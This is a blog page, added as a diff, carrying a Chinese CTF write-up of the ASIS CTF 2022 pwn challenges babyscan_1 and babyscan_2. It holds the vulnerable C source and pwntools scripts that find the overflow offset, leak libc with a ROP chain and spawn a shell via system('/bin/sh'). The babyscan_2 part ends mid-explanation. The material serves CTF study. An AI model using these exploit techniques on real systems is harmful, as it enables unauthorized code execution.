@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"xiaoxiaoxy1.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="ctf题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="step1">
+<meta property="og:url" content="http://xiaoxiaoxy1.github.io/2022/10/21/step1/index.html">
+<meta property="og:site_name" content="xiaoxiaoxy">
+<meta property="og:description" content="ctf题">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://xiaoxiaoxy1.github.io/2022/10/21/step1/1.png">
+<meta property="og:image" content="http://xiaoxiaoxy1.github.io/2022/10/21/step1/2.png">
+<meta property="article:published_time" content="2022-10-21T09:28:06.000Z">
+<meta property="article:modified_time" content="2022-10-21T12:22:06.098Z">
+<meta property="article:author" content="xiaoxiaoxy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://xiaoxiaoxy1.github.io/2022/10/21/step1/1.png">
+
+
+<link rel="canonical" href="http://xiaoxiaoxy1.github.io/2022/10/21/step1/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://xiaoxiaoxy1.github.io/2022/10/21/step1/","path":"2022/10/21/step1/","title":"step1"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>step1 | xiaoxiaoxy</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="xiaoxiaoxy" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">xiaoxiaoxy</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ASIS-CTF-2022-pwn"><span class="nav-number">1.</span> <span class="nav-text">ASIS CTF 2022 pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#babyscan-1"><span class="nav-number">1.1.</span> <span class="nav-text">babyscan_1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BA%90C%E4%BB%A3%E7%A0%81"><span class="nav-number">1.1.1.</span> <span class="nav-text">源C代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-number">1.1.2.</span> <span class="nav-text">解题思路</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E6%89%BE%E5%81%8F%E7%A7%BB%E5%80%BC"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">查找偏移值</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%A6%86%E5%86%99ret%E6%B3%84%E9%9C%B2libc%E5%9C%B0%E5%9D%80%E5%B9%B6%E9%87%8D%E6%96%B0%E6%89%A7%E6%96%B0main%E5%87%BD%E6%95%B0"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">覆写ret泄露libc地址并重新执新main函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%B0%83%E7%94%A8system-%E2%80%9C-bin-sh%E2%80%9D"><span class="nav-number">1.1.2.3.</span> <span class="nav-text">调用system(“&#x2F;bin&#x2F;sh”)</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">1.1.3.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#babyscan-2"><span class="nav-number">1.2.</span> <span class="nav-text">babyscan_2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BA%90C%E4%BB%A3%E7%A0%81-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">源C代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">解题思路</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%87%8D%E6%89%A7main-%E5%87%BD%E6%95%B0%E6%88%96start-%E5%87%BD%E6%95%B0"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">重执main()函数或start()函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2libc"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">泄露libc</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%B0%83%E7%94%A8execve-%E2%80%9C-bin-sh%E2%80%9D-%E5%8F%82%E6%95%B02-%E5%8F%82%E6%95%B02"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">调用execve(“&#x2F;bin&#x2F;sh”,参数2,参数2);</span></a></li></ol></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="xiaoxiaoxy"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">xiaoxiaoxy</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://xiaoxiaoxy1.github.io/2022/10/21/step1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="xiaoxiaoxy">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xiaoxiaoxy">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          step1
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2022-10-21 17:28:06 / Modified: 20:22:06" itemprop="dateCreated datePublished" datetime="2022-10-21T17:28:06+08:00">2022-10-21</time>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">ctf题</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="ASIS-CTF-2022-pwn"><a href="#ASIS-CTF-2022-pwn" class="headerlink" title="ASIS CTF 2022 pwn"></a>ASIS CTF 2022 pwn</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;参考链接(题目附件看这)：<a target="_blank" rel="noopener" href="https://blingblingxuanxuan.github.io/2022/10/17/asis-ctf-2022-pwn/">ASIS CTF 2022 pwn babyscan_1 babyscan_2 | blingbling’s blog (blingblingxuanxuan.github.io)</a></p>
+<h3 id="babyscan-1"><a href="#babyscan-1" class="headerlink" title="babyscan_1"></a>babyscan_1</h3><h4 id="源C代码"><a href="#源C代码" class="headerlink" title="源C代码"></a>源C代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> size[<span class="number">16</span>], fmt[<span class="number">8</span>], *buf;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%15s&quot;</span>, size);			</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">isdigit</span>(*size)) &#123;		<span class="comment">//判断是否为数字,遇到非数字字符自动截止</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] Invalid number&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  buf = (<span class="keyword">char</span>*)alloca(atoi(size) + <span class="number">1</span>);	<span class="comment">//栈上申请一块内存空间	</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;data: &quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(fmt, <span class="keyword">sizeof</span>(fmt), <span class="string">&quot;%%%ss&quot;</span>, size);  <span class="comment">//将输入的[size]变为 %[size]s 存入fmt	</span></span><br><span class="line">  <span class="built_in">scanf</span>(fmt, buf);	  <span class="comment">//搭配上句得到的效果为：scanf(&quot;%[size]s&quot;,buf);</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<br/>
+
+<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1、假设我们对size输入1$、12$…….等这种以$结尾的字符串，isdigit()时只会判定前面的1、12……这些数字，这样我们就能做到既不在isdigit()判定时退出程序，又能将 $ 输入进 size 中</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2、当 $ 输入进 size 后，通过snprintf()与scanf()的搭配，我们能构造出scanf(“%1$s”,buf)、scanf(“%12$s”,buf)等这样的输入函数，而%1$n、%12$s这样的格式化字符串我们在格式化字符串漏洞中经常利用，所以我们依照格式化字符串漏洞的那套解题思路进行后续步骤。</p>
+<p><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3、scanf(“%12$s”,buf)的意思是向栈上scanf的第12个参数位置上存储的地址处输入任意长度字符串</strong></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4、64位函数参数存储顺序如下图，只要是存储着栈地址的参数我们都能用(第3条说明了向参数存储的地址处写入任意长度字符串)，从图中我们可以看到有RDI、RSI、RDX、参数12、参数13，对应%0$s、%1$s、%2$s、%11$s、%12$s，其中参数12存储的是高于当前函数栈帧rbp的栈地址，不好找更高地址的rbp在哪个位置，所以不考虑使用%11$s，本题我们利用%1$s。</p>
+<p><img src="1.png" alt="image-20221021181532541"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5、之后便是一系列模板操作：查找偏移值、覆写ret控制执行流、重执main()函数或start()函数、泄露libc地址、调用system(“/bin/sh”)</p>
+<h5 id="查找偏移值"><a href="#查找偏移值" class="headerlink" title="查找偏移值"></a>查找偏移值</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用以下脚本可得知偏移值为72</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">myelf = ELF(<span class="string">&quot;./bin/chall&quot;</span>)</span><br><span class="line">mylibc = ELF(<span class="string">&quot;./lib/libc.so.6&quot;</span>)</span><br><span class="line">myld = ELF(<span class="string">&quot;./lib/ld-2.31.so&quot;</span>)</span><br><span class="line">myio = process(argv=[myld.path,myelf.path],env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : mylibc.path&#125;)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(myio,<span class="string">&quot;b *0x401364 \n c&quot;</span>)</span><br><span class="line">myio.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="string">b&quot;1$&quot;</span>)</span><br><span class="line">myio.sendlineafter(<span class="string">&quot;data: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">myio.interactive()</span><br></pre></td></tr></table></figure>
+
+<h5 id="覆写ret泄露libc地址并重新执新main函数"><a href="#覆写ret泄露libc地址并重新执新main函数" class="headerlink" title="覆写ret泄露libc地址并重新执新main函数"></a>覆写ret泄露libc地址并重新执新main函数</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">myelf = ELF(<span class="string">&quot;./bin/chall&quot;</span>)</span><br><span class="line">mylibc = ELF(<span class="string">&quot;./lib/libc.so.6&quot;</span>)</span><br><span class="line">myld = ELF(<span class="string">&quot;./lib/ld-2.31.so&quot;</span>)</span><br><span class="line">myio = process(argv=[myld.path,myelf.path],env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : mylibc.path&#125;)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401433</span></span><br><span class="line">got_snprintf = <span class="number">0x404030</span></span><br><span class="line">plt_puts = <span class="number">0x4010B4</span></span><br><span class="line">main_addr = <span class="number">0x401216</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">72</span>+p64(pop_rdi)+p64(got_snprintf)+p64(plt_puts)+ p64(main_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(myio,&quot;b *0x401364 \n c&quot;)</span></span><br><span class="line">myio.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="string">b&quot;1$&quot;</span>)</span><br><span class="line">myio.sendlineafter(<span class="string">&quot;data: &quot;</span>,payload)</span><br><span class="line">snprintf_addr = u64(myio.recvline()[:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = snprintf_addr - <span class="number">0x61d60</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">myio.interactive()</span><br></pre></td></tr></table></figure>
+
+<h5 id="调用system-“-bin-sh”"><a href="#调用system-“-bin-sh”" class="headerlink" title="调用system(“/bin/sh”)"></a>调用system(“/bin/sh”)</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">myelf = ELF(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line">mylibc = ELF(<span class="string">&quot;../lib/libc.so.6&quot;</span>)</span><br><span class="line">myld = ELF(<span class="string">&quot;../lib/ld-2.31.so&quot;</span>)</span><br><span class="line">myio = process(argv=[myld.path,myelf.path],env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : mylibc.path&#125;)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401433</span></span><br><span class="line">got_snprintf = <span class="number">0x404030</span></span><br><span class="line">plt_puts = <span class="number">0x4010B4</span></span><br><span class="line">main_addr = <span class="number">0x401216</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">72</span>+p64(pop_rdi)+p64(got_snprintf)+p64(plt_puts)+ p64(main_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(myio,&quot;b *0x401364 \n c&quot;)</span></span><br><span class="line">myio.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="string">b&quot;1$&quot;</span>)</span><br><span class="line">myio.sendlineafter(<span class="string">&quot;data: &quot;</span>,payload)</span><br><span class="line">snprintf_addr = u64(myio.recvline()[:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = snprintf_addr - <span class="number">0x61d60</span></span><br><span class="line"></span><br><span class="line">system_addr = libc_base + <span class="number">0x52290</span></span><br><span class="line">bin_sh_addr = libc_base + <span class="number">0x1B45BD</span></span><br><span class="line"></span><br><span class="line">exec_bin_sh = libc_base + <span class="number">0xe3b01</span></span><br><span class="line">myio.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="string">b&quot;1$&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">72</span> + p64(ret) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr) </span><br><span class="line">myio.sendlineafter(<span class="string">&quot;data: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">myio.interactive()</span><br></pre></td></tr></table></figure>
+
+<br/>
+
+<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1、学到了python脚本中更换二进制文件的 ld 与 libc 操作：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">myelf = ELF(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line">mylibc = ELF(<span class="string">&quot;../lib/libc.so.6&quot;</span>)</span><br><span class="line">myld = ELF(<span class="string">&quot;../lib/ld-2.31.so&quot;</span>)</span><br><span class="line">myio = process(argv=[myld.path,myelf.path],env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : mylibc.path&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2、巩固了pwn题基础知识，见识了初看完全看不懂的C语言代码</p>
+<br/>
+
+<br/>
+
+<h3 id="babyscan-2"><a href="#babyscan-2" class="headerlink" title="babyscan_2"></a>babyscan_2</h3><h4 id="源C代码-1"><a href="#源C代码-1" class="headerlink" title="源C代码"></a>源C代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> size[<span class="number">16</span>], fmt[<span class="number">8</span>], *buf;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%15s&quot;</span>, size);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">isdigit</span>(*size)) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] Invalid number&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  buf = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(atoi(size) + <span class="number">1</span>);    <span class="comment">//堆上申请一块空间</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;data: &quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(fmt, <span class="keyword">sizeof</span>(fmt), <span class="string">&quot;%%%ss&quot;</span>, size);</span><br><span class="line">  <span class="built_in">scanf</span>(fmt, buf);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);    <span class="comment">//从 return 0; 变成了 exit(0); 估计有用不然没必要改</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor))</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">  alarm(<span class="number">180</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1、出现 malloc ，但没出现 free() 函数，无法利用堆相关的解题方法</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2、注意到 scanf(“%15s”, size); ，可以输入一个数字，同时在输入一个数字后可以输入一些字符串，只要总体长度不超过15就行，而size存储在栈上，也就是说我们可以向栈上输入一些我们想要输入的字符，因此或许我们可以利用与上题类似的思路解这道题</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3、gdb调试，向程序输入1$xxxxyyyyzzzz，可以看到在第10个参数位置存储着我们输入的字符串 yyzzzz，</p>
+<p><img src="2.png" alt="image-20221021191405157"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>4、既然这样，我们可以将 yyzzzz 替换为任意地址 aaaaaa，然后在输入size时输入 9$xxaaaaaa，就可以向地址 aaaaaa 处写任意长度的字符串</strong></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5、接下来是套模板：查找偏移值、覆写ret控制执行流、重执main()函数或start()函数、泄露libc地址、调用system(“/bin/sh”)，不过这题buf不在栈上，我们想要覆写ret来控制执行流的话有点困难，同时调用system(“/bin/sh”)也很困难，那我们就只能考虑libc中现有的 execve() 来获取shell。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，程序中不存在后门函数，我们就必须要泄露libc地址，利用libc中的 execve(“/bin/sh”,参数2,参数2); </p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其次，想要做到泄露libc地址的同时又调用execve()，那就必须有重新执行main()函数或start()函数这一步骤</p>
